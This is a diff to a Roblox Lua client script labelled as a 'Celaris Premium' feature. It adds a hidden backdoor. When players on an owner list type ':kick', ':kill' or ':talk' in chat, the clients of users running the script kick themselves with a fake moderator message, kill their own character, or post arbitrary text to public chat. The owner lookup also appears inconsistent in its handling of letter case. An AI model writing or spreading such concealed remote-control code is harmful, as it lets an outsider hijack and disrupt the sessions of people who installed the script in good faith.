@@ -11,11 +11,11 @@ end
 -- // Celaris Premium (New Feature)
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local StarterGui = game:GetService("StarterGui")
 local LocalPlayer = Players.LocalPlayer
 
 local ownerNames = {
-    ["R0cketLucky2020"] = true
+    ["R0cketLucky2020"] = true,
+    ["xleskyy"] = true
 }
 
 -- Check if player is an owner
@@ -23,16 +23,17 @@ local function isOwner(name)
     return ownerNames[name:lower()] == true
 end
 
--- Find player by partial name (Username or DisplayName)
+-- Find a player from a name fragment (username or displayname)
 local function findPlayerByName(nameFragment)
     nameFragment = nameFragment:lower()
     for _, plr in ipairs(Players:GetPlayers()) do
-        if plr ~= LocalPlayer then -- Prevent self-kick
-            if plr.Name:lower() == nameFragment or plr.DisplayName:lower() == nameFragment then
-                return plr
-            elseif plr.Name:lower():find(nameFragment) or plr.DisplayName:lower():find(nameFragment) then
-                return plr
-            end
+        local uname = plr.Name:lower()
+        local dname = plr.DisplayName:lower()
+
+        if uname == nameFragment or dname == nameFragment then
+            return plr
+        elseif uname:find(nameFragment) or dname:find(nameFragment) then
+            return plr
         end
     end
     return nil
@@ -45,43 +46,65 @@ local function handleCommand(message, speaker)
     local args = message:split(" ")
     local cmd = args[1]:lower()
 
+    -- :talk command
     if cmd == ":talk" then
-        local say = message:sub(#args[1] + 2)
-        local chatRemote = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
+        local say = message:sub(#cmd + 2)
+        local chatRemote = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
         if chatRemote and chatRemote:FindFirstChild("SayMessageRequest") then
             chatRemote.SayMessageRequest:FireServer(say, "All")
         end
 
+    -- :kick command
     elseif cmd == ":kick" and args[2] then
-        local targetName = message:sub(#cmd + 2):gsub("^%s*(.-)%s*$", "%1")
-        local targetPlayer = findPlayerByName(targetName)
+        local targetName = message:sub(#cmd + 2):gsub("^%s*(.-)%s*$", "%1"):lower()
+        local match = false
 
-        if targetPlayer then
-            if targetPlayer == LocalPlayer then return end -- Never kick yourself
-            game:GetService("StarterGui"):SetCore("SendNotification", {
-                Title = "You’ve been kicked",
-                Text = "The owner removed your access.",
-                Duration = 5
-            })
+        if not isOwner(LocalPlayer.Name) then
+            local uname = LocalPlayer.Name:lower()
+            local dname = LocalPlayer.DisplayName:lower()
+
+            if uname == targetName or dname == targetName or uname:find(targetName) or dname:find(targetName) then
+                match = true
+            end
+        end
+
+        if match then
             task.wait(2)
             LocalPlayer:Kick("Celaris | A Premium Member/Moderator has kicked you from the server")
+        end
+
+    -- :kill command
+    elseif cmd == ":kill" and args[2] then
+        local targetName = message:sub(#cmd + 2):gsub("^%s*(.-)%s*$", "%1"):lower()
+        local uname = LocalPlayer.Name:lower()
+        local dname = LocalPlayer.DisplayName:lower()
+
+        if not isOwner(LocalPlayer.Name) and (
+            uname == targetName or dname == targetName or
+            uname:find(targetName) or dname:find(targetName)
+        ) then
+            local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+            if hum then
+                hum.Health = 0
+            end
         end
     end
 end
 
--- Connect to all existing and future players
+-- Connect to chat events of a player
 local function connectPlayer(plr)
     plr.Chatted:Connect(function(msg)
         handleCommand(msg, plr)
     end)
 end
 
+-- Connect all existing players
 for _, plr in ipairs(Players:GetPlayers()) do
     connectPlayer(plr)
 end
 
+-- Connect future players
 Players.PlayerAdded:Connect(connectPlayer)
-
 
 
 
